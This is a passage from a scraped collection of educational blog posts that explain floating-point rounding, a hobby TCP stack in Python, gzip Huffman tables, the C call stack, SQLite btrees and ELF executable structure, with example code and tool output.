3602879701896397 \n\n >>> 2702159776422298  + 3602879701896397\n6305039478318695\n \n\n Cool. But  6305039478318695  is more than 2**52 - 1 (the maximum value for a significand), so we have a problem: \n\n >>> 6305039478318695 > 2**52\nTrue\n \n\n step 4: increase the exponent \n\n Right now our answer is \n\n 2**-3 + 6305039478318695 / 2**(52 + 3)\n \n\n First, let’s subtract 2**52 to get \n\n 2**-2 + 1801439850948199 / 2**(52 + 3)\n \n\n This is almost perfect, but the  2**(52 + 3)  at the end there needs to be a  2**(52 + 2) . \n\n So we need to divide 1801439850948199  by 2. This is where we run into inaccuracies –  1801439850948199  is odd! \n\n >>> 1801439850948199  / 2\n900719925474099.5\n \n\n It’s exactly in between two integers, so we round to the nearest even number (which is what the floating point specification says to do), so our final floating point number result is: \n\n >>> 2**-2 + 900719925474100 / 2**(52 + 2)\n0.30000000000000004\n \n\n That’s the answer we expected: \n\n >>> 0.1 + 0.2\n0.30000000000000004\n \n\n this probably isn’t exactly how it works in hardware \n\n The way I’ve described the operations here isn’t literally exactly\nwhat happens when you do floating point addition (it’s not “solving for X” for\nexample), I’m sure there are a lot of efficient tricks. But I think it’s about\nthe same idea. \n\n printing out floating point numbers is pretty weird \n\n We said earlier that the floating point number 0.3 isn’t equal to 0.3. It’s actually this number: \n\n >>> f\"{0.3:.80f}\"\n'0.29999999999999998889776975374843459576368331909179687500000000000000000000000000'\n \n\n So when you print out that number, why does it display  0.3 ? \n\n The computer isn’t actually printing out the exact value of the number, instead\nit’s printing out the  shortest  decimal number  d  which has the property that\nour floating point number  f  is the closest floating point number to  d . \n\n It turns out that doing this efficiently isn’t trivial at all, and there are a bunch of academic papers about it like  Printing Floating-Point Numbers Quickly and Accurately . or  How to print floating point numbers accurately . \n\n would it be more intuitive if computers printed out the exact value of a float? \n\n Rounding to a nice clean decimal value is nice, but in a way I feel like it\nmight be more intuitive if computers just printed out the exact value of a\nfloating point number – it might make it seem a lot less surprising when you\nget weird results. \n\n To me,\n0.1000000000000000055511151231257827021181583404541015625 +\n0.200000000000000011102230246251565404236316680908203125\n= 0.3000000000000000444089209850062616169452667236328125 feels less surprising than 0.1 + 0.2 = 0.30000000000000004. \n\n Probably this is a bad idea, it would definitely use a lot of screen space. \n\n a quick note on PHP \n\n Someone in the comments somewhere pointed out that  <?php echo (0.1 + 0.2 );?> \nprints out  0.3 . Does that mean that floating point math is different in PHP? \n\n I think the answer is no – if I run: \n\n <?php echo (0.1 + 0.2 )- 0.3);?>  on  this\n page , I get the exact same answer as in\n Python 5.5511151231258E-17. So it seems like the underlying floating point\n math is the same. \n\n I think the reason that  0.1 + 0.2  prints out  0.3   in PHP is that PHP’s\n algorithm for displaying floating point numbers is less precise than Python’s\n – it’ll display  0.3  even if that number isn’t the closest floating point\n number to 0.3. \n\n that’s all! \n\n I kind of doubt that anyone had the patience to follow all of that arithmetic,\nbut it was helpful for me to write down, so I’m publishing this post anyway.\nHopefully some of this makes sense. \n\n"},
{"url": "https://jvns.ca/blog/2014/08/12/what-happens-if-you-write-a-tcp-stack-in-python/", "title": "What happens if you write a TCP stack in Python?", "content": "\n      During Hacker School, I wanted to understand networking better, and I\ndecided to write a miniature TCP stack as part of that. I was much\nmore comfortable with Python than C and I’d recently discovered the\n scapy  networking library\nwhich made sending packets\n really easy . \n\n So I started writing  teeceepee ! \n\n The basic idea was \n\n \n open a raw network socket that lets me send TCP packets \n send a HTTP request to  GET  google.com \n get and parse a response \n celebrate! \n \n\n I didn’t care much about proper error handling or anything; I just\nwanted to get one webpage and declare victory :) \n\n \n\n Step 1: the TCP handshake \n\n I started out by doing a TCP handshake with Google! (this won’t\nnecessarily run correctly, but illustrates the principles). I’ve\ncommented each line. \n\n The way a TCP handshake works is: \n\n \n me: SYN \n google: SYNACK! \n me: ACK!!! \n \n\n Pretty simple, right? Let’s put it in code. \n\n # My local network IP\nsrc_ip = \"192.168.0.11\"\n# Google's IP\ndest_ip = \"96.127.250.29\"\n# IP header: this is coming from me, and going to Google\nip_header = IP(dst=dest_ip, src=src_ip)\n# Specify a large random port number for myself (59333),\n# and port 80 for Google The \"S\" flag means this is\n# a SYN packet\nsyn = TCP(dport=80, sport=59333, \n          ack=0, flags=\"S\")\n# Send the SYN packet to Google\n# scapy uses '/' to combine packets with headers\nresponse = srp(ip_header / syn)\n# Add the sequence number \nack = TCP(dport=80, sport=self.src_port, \n          ack=response.seq, flags=\"A\") \n# Reply with the ACK\nsrp(ip_header / ack)\n \n\n Wait, sequence numbers? \n\n What’s all this about sequence numbers? The whole point of TCP is to\nmake sure you can resend packets if some of them go missing. Sequence\nnumbers are a way to check if you’ve missed packets. So let’s say that\nGoogle sends me 4 packets, size 110, 120, 200, and 500 bytes. Let’s\npretend the initial sequence number is 0. Then those packets will have\nsequence numbers 0, 110, 230, and 430. \n\n So if I suddenly got a 100-byte packet with a sequence number of 2000,\nthat would mean I missed a packet! The next sequence number should be\n930! \n\n How can Google know that I missed the packet? Every time I receive a\npacket from Google, I need to send an ACK (“I got the packet with\nsequence number 230, thanks!“). If the Google server notices I haven’t\nACKed a packet, then it can resend it! \n\n The TCP protocol is extremely complicated and has all kinds of rate\nlimiting logic in it, but we’re not going to talk about any of that.\nThis is all you’ll need to know about TCP for this post! \n\n For a more in-depth explanation, including how SYN\npackets affect sequence numbers, I found\n Understanding TCP sequence numbers \nvery clear. \n\n Step 2: OH NO I already have a TCP stack \n\n So I ran the code above, and I had a problem. IT DIDN’T WORK. \n\n But in a kind of funny way! I just didn’t get any responses. I looked\nin Wireshark (a wonderful tool for spying on your packets) and it\nlooked like this: \n\n me: SYN\ngoogle: SYNACK\nme: RST\n \n\n Wait, what? I never sent a  RST  packet?!  RST  means STOP THE\nCONNECTION IT’S OVER. That is not in my code at all! \n\n This is when I remembered that I  already  have a TCP stack on my\ncomputer, in my kernel. So what was actually happening was: \n\n my Python program: SYN\ngoogle: SYNACK\nmy kernel: lol wtf I never asked for this! RST!\nmy Python program: ... :(\n \n\n So how do we bypass the kernel? I talked to the delightful\n Jari Takkala  about this, and he\nsuggested using\n ARP spoofing \nto pretend I had a different IP address (like  192.168.0.129 ). \n\n The new exchange was like this: \n\n me: hey router! send packets for 192.168.0.129 to my MAC address\nrouter: (does it silently)\nmy Python program: SYN (from 192.168.0.129)\ngoogle: SYNACK\nkernel: this isn't my IP address! <ignore>\nmy Python program: ACK YAY\n \n\n And it worked! Okay, awesome, we can now send packets AND GET\nRESPONSES without my kernel interfering! AWESOME. \n\n Step 3: get a webpage! \n\n There is an intervening step here where I fix tons of irritating bugs\npreventing Google from sending me the HTML for  http://google.com . I\neventually fixed all of these, and emerge victorious! \n\n I needed to \n\n \n put together a packet containing a HTTP GET request \n make sure I can listen for  lots  of packets in response, not just\none \n spend a lot of time fixing bugs with sequence numbers \n try to close the connection properly \n \n\n Step 4: realize Python is slow \n\n Once I had everything working, I used Wireshark again to look at what\npackets were being sent back and forth. It looked something like this: \n\n me/google: <tcp handshake>\nme: GET google.com\ngoogle: 100 packets\nme: 3 ACKs\ngoogle: <starts resending packets>\nme: a few more ACKs\ngoogle: <reset connection>\n \n\n The sequences of packets from Google and ACKs from me looked something\nlike: P P P A P P P P P A P P A P P P P A. Google was sending me\npackets  way  faster than my program could keep up and send ACKs.\nThen, hilariously, Google’s server would assume that there were\nnetwork problems causing me to not ACK its packets. \n\n And it would eventually reset the connection because it would decide\nthere were connection problems. \n\n But the connection was fine! My program was totally responding! It was\njust that my Python program was way too slow to respond to packets in\nthe millisecond times it expected. \n\n (edit: this diagnosis seems to be incorrect :) you can\n read some discussion \nabout what may be actually going on here) \n\n life lessons \n\n If you’re actually writing a production TCP stack, don’t use Python.\n(surprise!) Also, the TCP spec is really complicated, but you can get\nservers to reply to you even if your implementation is extremely sketchy. \n\n I was really happy that it actually worked, though! The ARP spoofing\nwas extremely finicky, but I wrote a version of  curl  using it which\nworked about 25% of the time. You can see all the absurd code at\n https://github.com/jvns/teeceepee/ . \n\n I think this was actually way more fun and instructive than trying to\nwrite a TCP stack in an appropriate language like C :) \n"},
{"url": "https://jvns.ca/blog/2015/02/22/how-gzip-uses-huffman-coding/", "title": "How gzip uses Huffman coding", "content": "\n      I wrote a blog post quite a while ago called  gzip + poetry = awesome \nwhere I talked about how the gzip compression program uses the LZ77 algorithm\nto identify repetitions in a piece of text. \n\n In case you don’t know what LZ77 is (I sure didn’t), here’s the video from that\npost that gives you an example of gzip identifying repetitions in a poem! \n\n \n\n \n\n I thought this was a great demonstration, but it’s only half the story about\nhow gzip works, and it’s taken me until now to write the rest of it down. So!\nWithout further ado, let’s say we’re compressing this text: \n\n a tapping, as of someone gently \nr{apping},{ rapping}\nat my chamber door\n \n\n \n\n It’s identified  apping  and  rapping  as being repeated, so gzip then encodes\nthat as, roughly \n\n a tapping, as of someone gently\nr{back 30 characters, copy 6},\n{back 9 characters, copy 8} at my chamber door\n \n\n Once it’s gotten rid of the repetitions, the next step is to compress the\nindividual characters. That is – if we have some text like \n\n ab bac ead gae haf iaj kal man oap\n \n\n there isn’t any repetition to eliminate, but  a  is the most common letter, so\nwe should compress it more than the other letters  bcdefghijklmnop . \n\n How gzip uses Huffman coding to represent individual characters \n\n gzip compresses bytes, so to make an improvement we’re going to want to be able\nto represent some bytes using less than a byte (8 bits) of space. Our\ncompressed text might look something like \n\n 0101010010101010001010010010010101001010001010100101010101\n1001010101010010011111111000000110000100000101000000000000\n \n\n Those were totally made up 0s and 1s and do not mean anything. But, reading\nsomething like this, how can you know where the boundaries between characters\nare? Does 01 represent a character? 010? 0101? 01010? \n\n This is where a really smart idea called  Huffman coding  comes in! The idea\nis that we represent our characters (like a, b, c, d, ….) with codes like \n\n a: 00\nb: 010\nc: 011\nd: 1000\ne: 1001\nf: 1010\ng: 1011\nh: 1111\n \n\n If you look at these carefully, you’ll notice something special! It’s that none\nof these codes is a prefix of any other code. So if we write down\n 010001001011  we can see that it’s  010 00 1001 011  or  baec ! There wasn’t\nany ambiguity, because  0  and  01  and  0100   don’t mean anything. \n\n You might ALSO notice that these are all less than 8 bits! That means we’re\ndoing COMPRESSION. This Huffman table will let us compress anything that only\nhas  abcdefgh s in it. \n\n These Huffman tables are usually represented as  trees . Here’s the Huffman\ntree for the table I wrote down above: \n\n \n\n You can see that, for instance, if you follow the path  011  then you get to  c . \n\n Let’s read some real Huffman tables! \n\n It’s all very well and good to have a theoretical idea of how this works, but I\nlike looking at Real Stuff. \n\n There’s a really great program called  infgen  that I found this morning that\nhelps you see the contents of a gzip file. You can get it with \n\n wget http://zlib.net/infgen.c.gz\ngunzip infgen.c.gz\n \n\n When we run ./infgen raven.txt.gz , it prints out some somewhat cryptic output like \n\n litlen 10 6\nlitlen 32 5\nlitlen 33 9\nlitlen 34 10\nlitlen 39 8\nlitlen 44 6\nlitlen 45 9\nlitlen 46 9\nlitlen 59 9\nlitlen 63 10\n[... lots more ...]\nliteral 'Once upon a midnight dreary, while I \nmatch 3 31\nliteral 'dered weak an\nmatch 5 9\nmatch 3 33\nliteral 10 'Over many\nmatch 3 62\nliteral 'quaint\nmatch 5 30\nliteral 'curious volume of forgotten lore,\n \n\n This is really neat! It’s telling us how gzip’s chosen to compress The Raven.\nWe’re going to ignore the parts that make sense (“Once upon a midnight\ndreary..“) and just focus on the confusing  litlen  parts. \n\n These  litlen  lines are weird! Thankfully I spent 5 straight days thinking\nabout gzip  in October 2013 \nso I know what they mean.  litlen 10 6  means “The ASCII character 10 is\nrepresented with a code of length 6”. Which initially seems totally unhelpful!\nLike, who cares if it’s represented with a code of length 6 if I DON’T KNOW\nWHAT THAT CODE IS?!! \n\n BUT! Let’s sort these by code length first, and translate the ASCII codes to\ncharacters. \n\n    ' ' 6\n   'a' 6\n   'e' 6\n   'i' 6\n   'n' 6\n   'o' 6\n   'r' 6\n   's' 6\n   't' 6\n  '\\n' 7\n   ',' 7\n   'b' 7\n   'c' 7\n \n\n For starters, these are some of the most common letters in the English\nlanguage, so it TOTALLY MAKES SENSE that these would be encoded most\nefficiently. Yay! \n\n The gzip specification actually specifies an algorithm for translating these\nlengths into a Huffman table! We start with 000000, and then add 1 in binary\neach time. If the code length ever increases, then we shift left. (so 100 ->\n1010). Let’s apply that to these code lengths! \n\n   ' ' 000000\n   'a' 000001\n   'e' 000010\n   'i' 000011\n   'n' 000100\n   'o' 000101\n   'r' 000110\n   's' 000111\n   't' 001000\n  '\\n' 0010010\n   ',' 0010011\n   'b' 0010100\n   'c' 0010101\n   'd' 0010110\n   'f' 0010111\n   'h' 0011000\n   'l' 0011001\n   'm' 0011010\n   'p' 0011011\n   'u' 0011100\n \n\n I found all this out by reading  this incredibly detailed page , in case you want to know\nmore. \n\n I wrote a script to do this, and you can try it out yourself! It’s at\n https://github.com/jvns/gzip-huffman-tree \n\n I tried it out on the compressed source code  infgen.c.gz , and you can totally\nsee it’s source code and not a novel! \n\n  ' ' 00000\n 'a' 000010\n 'e' 000011\n 'i' 000100\n 'n' 000101\n 'o' 000110\n 'r' 000111\n 's' 001000\n '\"' 0010010\n '(' 0010011\n ')' 0010100\n ',' 0010101\n '-' 0010110\n \n\n I really like going through explorations like this because they give\nme a better idea of how things like Huffman codes are used in real\nlife! It’s kind of my favorite when things I learned about in math\nclass show up in the programs I use every day. And now I feel like I\nhave a better idea of when it would be appropriate to use a technique\nlike this. \n"},
{"url": "https://jvns.ca/blog/2016/02/27/a-few-notes-on-the-stack/", "title": "What is \"the stack\"?", "content": "\n     \n\n Last week I was at  Papers We\nLove , my new favorite meetup.\nAnd someone mentioned “the stack” in passing, and I decided to ask – what is\nthat, really? I talked about it with  Julian  (who, like many people I know, is the best). \n\n The basic question I want to answer here is – why do people sometimes discuss “the stack” like it’s some kind of revered fundamental object? (the answer is going to turn out to be “because it is”, and I’m going to try to make that as concrete as I can.) \n\n Calling a function \n\n Let’s talk about the basics before it gets weird. Suppose you’re in a programming language. Any programming language. Most languages have the concept of a “function” and “calling a function”. \n\n Whenever you call a function, you also need to  return  from that function. So, as a simple example – \n\n def elephant(x):\n  value = panda(x)\n  return value + 2\n\ndef panda(y):\n  return y * 3\n \n\n So if we call  elephant(3) , we’re going to call  panda(3)  next, and we need to remember that we were in  elephant  before. \n\n Normally programming languages keep track of this information in a data structure called the  call stack , which you can imagine like \n\n 1) elephant <-- you were here before\n2) panda <-- you are here now\n \n\n Calling a function in C (and why C is special) \n\n Most languages have some kind of call stack data structure. Python! Ruby! C! Java! But that could be anything, right? \n\n For a long time I’ve been vaguely confused about this, because I often hear references to “stack smashing” or “stack overflows” or “setting a stack size”, like there’s a canonical stack that all programs have. And there is a One True Stack! \n\n As in most cases with the One True Anything on Linux, the One True Call Stack is the C call stack. \n\n To understand why, it helps to to look at a C program and what it compiles to. I wrote one for this blog post: \n\n #include <stdio.h>\n\nint main() {\n    blah(3);\n    printf(\"Penguin!\\n\");\n}\n\nint blah(int x) {\n    return x;\n}\n \n\n Pretty simple! When your CPU runs programs, it’s ultimately running assembly instructions. Let’s look at the assembly instructions for this program: \n\n $ gcc -o hello hello.c\n$ objdump -d hello\n address       instructions (binary)   instructions (english)\n00000000004004f4 <main>:\n  4004f4:       55                      push   %rbp\n  4004f5:       48 89 e5                mov    %rsp,%rbp\n  4004f8:       bf 03 00 00 00          mov    $0x3,%edi\n  4004fd:       e8 0c 00 00 00          callq  40050e <blah>\n  400502:       bf 0c 06 40 00          mov    $0x40060c,%edi\n  400507:       e8 e4 fe ff ff          callq  4003f0 <puts@plt>\n  40050c:       5d                      pop    %rbp\n  40050d:       c3                      retq   \n\n000000000040050e <blah>:\n  40050e:       55                      push   %rbp\n  40050f:       48 89 e5                mov    %rsp,%rbp\n  400512:       89 7d fc                mov    %edi,-0x4(%rbp)\n  400515:       8b 45 fc                mov    -0x4(%rbp),%eax\n  400518:       5d                      pop    %rbp\n  400519:       c3                      retq   \n  40051a:       90                      nop\n  40051b:       90                      nop\n  40051c:       90                      nop\n \n\n Delightfully, this is very simple – all of the assembly code for both these two functions fits on a page! \n\n We have two functions:  main  and  blah . We’re lucky that  blah  is a Very Simple Function: it only has 4 kinds of instructions in it,  push ,  pop ,  mov , and  retq . This is where we get into… \n\n Assembly instructions and The Stack \n\n What does  push %rbp  mean? It means “put the address in %rbp on The Stack”. But what does it mean to put something on the Stack-with-a-capital-S? \n\n Well, this is where we get to the very important  stack pointer . There’s a special register called  %rsp  where, conventionally, an address called the stack pointer is stored. \n\n Imagine that I have a region in memory like this. I’ve used 64 bit increments because I have a 64-bit processor. \n\n address         value\n832               4\n824               29328323\n816               283842\n808               128\n \n\n Now suppose the address in  %rsp  is 808. Then  push 3  would mean “decrement %rsp and put 3 at the next lowest address in memory”. So we’d have \n\n address          value\n832               4\n824               29328323\n816               283842\n808               128\n800               3\n \n\n This means that the  push  and  pop  instructions both make very fundamental assumptions about the memory layout of your program – that  %rsp  represents an address they can access, and that the memory there is split up into 8 byte (64 bit) chunks that represent the current stack. \n\n Next up, we need to discuss  retq  and  callq .  retq  needs to return to main after the function  blah()  is done running. How does that even work? \n\n Well! When we execute the instruction  callq , the address  0x00400502  gets pushed onto the stack (where  %rsp  is). Then when we later execute  retq , it can look in the stack and discover that it needs to go back to the address  0x00400502  to continue program execution. If we changed that address in the stack to be something totally different, the program wouldn’t know how to execute anymore! It would do something Very Different. \n\n I found it pretty surprising that the x86 assembly instruction set knows about the C stack pointer and how the stack in C is laid out. Of course, you could invent your own new smart stack format, but you wouldn’t be able to use the  callq  and  retq  instructions to call functions. \n\n Which came first, the chicken or the egg? \n\n I just said that this is the “C stack format”, and the assembly assumes that everything is like C. But of course it could be the other away around – maybe the x86 instruction set came first, with its assumptions about how the One True Stack is organized, and then C conformed to that! And you could write a C compiler that uses a totally different stack format and is incompatible with every other program! \n\n I don’t know. Maybe you will tell me which came first – the compilers that laid out the stack this way, or the instructions! Did all this get decided in the 80s? in the 90s? in the 70s? \n\n In any case, it seems like we’re stuck with those choices now. Except! \n\n What if you wrote your own stack format? \n\n Since we are curious experimenters, we are brought to the obvious question – what would happen if we wrote our own stack format that was incompatible with the C stack? What if we used the One True Stack Pointer  %rsp  for our own nefarious purposes? \n\n This isn’t a theoretical question at all –  Rust  actually has a different calling convention from C, which means it sets up its stack differently. \n\n This isn’t a super big deal in Rust – if you want to call a C function from Rust, you can tell the compiler “hey just be normal like C for a bit, okay?”. And you can tell it to expose Rust functions like they were C functions. It’s fine. \n\n But you do need to be aware of it, if you’re a prospective weird-stack-programming-language author or user! For instance! If you want to use gdb with Rust, and you want to get a stack trace (“what function did I call before I called this one?”) – that wouldn’t normally work. gdb would not know how to interpret the stack! But Rust implements  libbacktrace , which tells GDB how the stack information corresponds to a stack trace. \n\n If you read the README there carefully, you’ll notice that Rust’s libbacktrace only works with ELF binaries! This means that you can’t get Rust stack traces with gdb on OS X or Windows, only in Linux/BSDs/other operating systems that ues ELF binaries. That actually really sucks! There are consequences to having an unusual stack format, and real work you need to do to make the rest of the world understand you. \n\n fascinating. \n\n I was really surprised that  assembly instructions  make assumptions about how memory is organized and what information is in which registers. This explains why people talk about The Stack like it’s this fundamental data structure instead of just one choice about how you could organize your program. It kind of is! \n\n If you want to more fun things to read, there’s a great article  Understanding C by learning assembly  which discusses using GDB to inspect memory and see exactly what’s going on when you run a C program. It’s super fun. \n\n There is so much to know!  @yrp604 on twitter  just told me that on ARM you can choose which direction the stack grows! Whoa. \n\n \nThanks to Oğuz Kayral, Kamal Marhubi, and Julian Squires for discussing this with me!\n \n\n"},
{"url": "https://jvns.ca/blog/2014/10/02/how-does-sqlite-work-part-2-btrees/", "title": "How does SQLite work? Part 2: btrees! (or: disk seeks are slow don't do them!)", "content": "\n      Welcome back to fun with databases! In\n Part 1 \nof this series, we learned that: \n\n \n SQLite databases are organized into fixed-size  pages . I made an\nexample database which had 1k pages. \n The pages are all part of a kind of tree called a  btree . \n There are two kinds of pages:  interior pages  and  leaf pages .\nData is only stored in leaf pages. \n \n\n I mentioned last time that I put in some print statements to tell me\nevery time I read a page, like this: \n\n sqlite> select * from fun where id = 10;\nRead a btree page, page number 4122\nRead a btree page, page number 900\nRead a btree page, page number 5\n \n\n Let’s understand a little bit more about how these btrees work! First,\nsome theory. \n\n Normally when I think about tracking tree accesses, I think about it\nin terms of “how many times you need to jump to a new node”. So in a\nbinary tree with depth 10, you might need to jump up to 10 times. \n\n \n\n One of the most important things in database optimization is disk I/O.\nReading more data than you absolutely need to read is really\nexpensive, because seeking to a new location in a file takes a long\ntime. It takes  way less  CPU time to search through your data than\nit does to read the data into memory (see:\n Computers are fast! ,\n Latency Numbers Every Programmer Should Know ). \n\n So for a simple database scan, reading more data than you need is a\nhuge problem \n\n So far we know that: \n\n \n Our database is organized into 1k pages \n We want to read as little of the database as possible to write a\nquery, and \n My filesystem has a “block size” of 4k, which means that it’s\nimpossible to read less than 4k at a time. \n \n\n We can conclude from this that we want to read  as few pages as\npossible . btrees are organized so that each node has lots of\nchildren, to keep the depth small, and so that we won’t have to read\ntoo many pages to find a row. \n\n My 100,000 row SQLite database has a btree with depth 3, so to fetch a\nnode I only need to read 3 pages. If I’d used a binary tree I would\nhave needed to do log(100000) / log(2) = 16 seeks! That’s more than\nfive times as many. So these btrees seem like a pretty good idea. \n\n The index and table btrees \n\n So far we’ve been talking like there’s only one btree. This isn’t\nactually true at all! My database has one table, and two btrees. \n\n Each table has a btree, made up of interior and leaf nodes. Leaf nodes\ncontain all the data, and interior nodes point to other child nodes. \n\n Every index for that table also has its own btree, where you can look\nup which row id a column value corresponds to. This is why maintaining\nlots of indexes is slow – every time you insert a row you need to\nupdate as many trees as you have indexes. \n\n Let’s dive into a query a bit more deeply. It turns out SQLite does a\nbinary search inside every page of every btree to find out what node\nto go to next. I’ve printed out the indexes it tries while doing the\nbinary search. \n\n sqlite> select * from fun where id = 1000;\n\nRead a btree page, page number 1\n\nSearching for 1000...\n\nRead a btree page, page number 4122\nNumber of cells in page: 62\nidx: 30\nidx: 14\nidx: 6\nidx: 2\nidx: 0\n\nRead a btree page, page number 900\nNumber of cells in page: 67\nidx: 33\nidx: 16\nidx: 7\nidx: 3\nidx: 1\nidx: 2\n\nRead a btree page, page number 7\nNumber of cells in page: 69\nidx: 34\nidx: 16\nidx: 7\nidx: 3\nidx: 1\nidx: 2\n\n-------------------------------------\nLooking for key: 99001\n\nRead a btree page, page number 2\nNumber of cells in page: 19\nCurrent key: index   9, value 51627\nCurrent key: index  14, value 75920\nCurrent key: index  16, value 86203\nCurrent key: index  17, value 91286\nCurrent key: index  18, value 95577\n\nRead a btree page, page number 4091\nNumber of cells in page: 67\nCurrent key: index  33, value 97372\nCurrent key: index  50, value 98277\nCurrent key: index  58, value 98698\nCurrent key: index  62, value 98927\nCurrent key: index  64, value 99044\nCurrent key: index  63, value 98985\n\nRead a btree page, page number 4129\nNumber of cells in page: 59\nCurrent key: index  29, value 99015\nCurrent key: index  14, value 99000\nCurrent key: index  21, value 99007\nCurrent key: index  17, value 99003\nCurrent key: index  15, value 99001\n1000|yummier\n\n \n\n Wow, that was a lot of work. There were actually two separate searches\nhere, in two different btrees. \n\n \n Look up the  rowid  associated with the number  1000  in the\n index btree  –  99001 .\n( some rowid docs ). \n Look up  99001  in the  table btree . \n \n\n It’s really neat to see it doing the binary search for  99001  inside\neach page! I couldn’t quite figure out how to get it to print out the\ncomparisons it was doing when looking up 1000 in the index btree,\nbecause it does some weird function pointer magic to do comparisons. \n\n Kamal  is parsing SQLite databases\nwith the Python construct module next to me right now and it is\nAMAZING. There may be future installments. Who knows! \n"},
{"url": "https://jvns.ca/blog/2014/09/06/how-to-read-an-executable/", "title": "How is a binary executable organized? Let's explore it!", "content": "\n      I used to think that executables were totally impenetrable. I’d\ncompile a C program, and then that was it! I had a Magical Binary\nExecutable that I could no longer read. \n\n It is not so! Executable file formats are regular file formats that\nyou can understand. I’ll explain some simple tools to start! We’ll be\nworking on Linux, with ELF binaries. (binaries are kind of the\ndefinition of platform-specific, so this is all platform-specific.)\nWe’ll be using C, but you could just as easily look at output from any\ncompiled language. \n\n Let’s write a simple C program,  hello.c : \n\n #include <stdio.h>\n\nint main() {\n    printf(\"Penguin!\\n\");\n}\n \n\n Then we compile it ( gcc -o hello hello.c ), and we have a binary called\n hello . This originally seems impenetrable (how do we even binary?!),\nbut let’s see how we can investigate it! We’re going to learn what\n symbols ,  sections , and  segments  are. At a high level: \n\n \n symbols  are like function names, and are used to answer “If I call\n printf  and it’s defined somewhere else, how do I find it?” \n symbols are organized into  sections  – code lives in one section\n( .text ), and data in another ( .data ,  .rodata ) \n sections are organized into  segments \n \n\n \n\n Throughout we’ll use a tool called  readelf  to look at these. \n\n So, let’s dive into our binary! \n\n Step 1: open it in a text editor! \n\n This is most naive possible way to view a binary. If run  cat hello ,\nI get something like this: \n\n \nELF>@@H@8\n@@@@@@��88@@@@�� ((`(`�\nPP`P`��P�td@,,Q�tdR�td((`(`��/lib64/ld-linux-x86-64.so.2GNUGNUϨ�n��8�w�j7*oL�h��\n__gmon_start__libc.so.6puts__libc_start_mainGLIBC_2.2.5ui\n1```H��k����H���5 H�[]�fff.�H�=p\nUH��t�H��]�H`��]Ð�UH����@�����]Ð�����������H�l$�L�d$�H�- L�%\nL�l$�L�t$�L�|$�H�\\$�H��8L)�A��I��H��I���s���H��t1@L��L��D��A��H��H9�u�H�\\H�l$L�d$L�l$\nL�t$(L�|$0H��8��Ð�������������UH��SH�H�\nH���t�(`DH���H�H���u�H�[]Ð�H��o���H��Penguin!;,����H\n \n\n There’s text here, though! This was not a total failure. In particular\nit says “Penguin!” and “ELF”. ELF is the name of the binary format. So\nthat’s something! Then there are a bunch of unprintable symbols, which\nisn’t a huge surprise because this is a binary. \n\n Step 2: use  readelf  to see the symbol table \n\n Throughout we’re going to use a tool called  readelf  to explore our\nbinary. Let’s start by running  readelf --symbols  on it. (another\npopular tool to do this is  nm ) \n\n $ readelf --symbols hello \n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5\n    59: 0000000000400410     0 FUNC    GLOBAL DEFAULT   13 _start\n    61: 00000000004004f4    16 FUNC    GLOBAL DEFAULT   13 main\n \n\n ( full output here ) \n\n Here we see three  symbols :  main  is the address of my  main() \nfunction.  puts  looks like a reference to the  printf  function I called\nin it (which I guess the compiler changed to  puts  as an\noptimization?).  _start  is pretty important. \n\n When the program starts running, you might think it starts at  main .\nIt doesn’t! It  actually  goes to  _start . This does a bunch of Very\nImportant Things that I don’t understand very well, including calling\n main . So I won’t explain them. \n\n So, what’s a symbol? \n\n Symbols \n\n When you write a program, you might write a function called  hello .\nWhen you compile the program, the binary for that function is labelled\nwith a  symbol  called  hello . If I call a function (like  printf )\nfrom a library, we need a way to look up the code for that function!\nThe process of looking up functions from libraries is called\n linking . It can happen either just after we compile the program\n(“static linking”) or when we run the program (“dynamic linking”). \n\n So symbols are what allow linking to work! Let’s find the symbol for\nprintf! It’ll be in  libc , where all the C standard library\nfunctions are. \n\n If I run  nm  on my copy of libc, it tells me “no symbols”. But the\ninternet tells me I can use  objdump -tT  instead! This works!\n objdump -tT /lib/x86_64-linux-gnu/libc-2.15.so  gives me\n this output . \n\n If you look at it, you’ll see  sprintf ,  strlen ,  fork ,  exec , and\neverything you might expect libc to have. From here we can start to\nimagine how dynamic linking works – we see that  hello  calls  puts ,\nand then we can look up the location of  puts  in libc’s symbol table. \n\n Step 3: use  objdump  to see the binary, and learn about sections! \n\n Opening our binary in a text editor was a bad way to open it.\n objdump  is a better way. Here’s an excerpt: \n\n $ objdump -s hello\nContents of section .text:\n 400410 31ed4989 d15e4889 e24883e4 f0505449  1.I..^H..H...PTI\n 400420 c7c0a005 400048c7 c1100540 0048c7c7  ....@.H....@.H..\n 400430 f4044000 e8c7ffff fff49090 4883ec08  ..@.........H...\nContents of section .interp:\n 400238 2f6c6962 36342f6c 642d6c69 6e75782d  /lib64/ld-linux-\n 400248 7838362d 36342e73 6f2e3200           x86-64.so.2.    \nContents of section .rodata:\n 4005f8 01000200 50656e67 75696e21 00        ....Penguin!.   \n \n\n You can see that it shows us all the bytes in the file as hex on the\nleft, and a translation into ASCII on the right. \n\n The are a whole bunch of  sections  here (see\n this gist  for the\nwhole thing). This shows you all the bytes in your binary! Some\nsections we care about: \n\n \n .text  is the program’s actual code (the assembly).  _start  and\n main  are both part of the  .text  section. \n .rodata  is where some read-only data is stored (in this case, our\nstring “Penguin!”) \n .interp  is the filename of the dynamic linker! \n \n\n The major difference between  sections  and  segments  is that\nsections are used at link time (by  ld ) and segments are used at\nexecution time.  objdump  shows us the contents of the sections, which\nis nice, but doesn’t give us as much metadata about the sections as\nI’d like. Let’s try  readelf  instead: \n\n $ readelf --sections hello\nSection Headers:\n  [Nr] Name              Type             Address           Offset\n       Size              EntSize          Flags  Link  Info  Align\n  [13] .text             PROGBITS         0000000000400410  00000410\n       00000000000001d8  0000000000000000  AX       0     0     16\n  [15] .rodata           PROGBITS         00000000004005f8  000005f8\n       000000000000000b  0000000000000000   A       0     0     4\n  [24] .data             PROGBITS         0000000000601010  00001010\n       0000000000000010  0000000000000000  WA       0     0     8\n  [25] .bss              NOBITS           0000000000601020  00001020\n       0000000000000010  0000000000000000  WA       0     0     8\n  [26] .comment          PROGBITS         0000000000000000  00001020\n       000000000000002a  0000000000000001  MS       0     0     1\nKey to Flags:\n  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)\n  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\n  O (extra OS processing required) o (OS specific), p (processor specific)\n \n\n ( full output ) \n\n Neat! We can see  .text  is executable and read-only,  .rodata  (“read\nonly data”) is read-only, and  .data  is read-write. 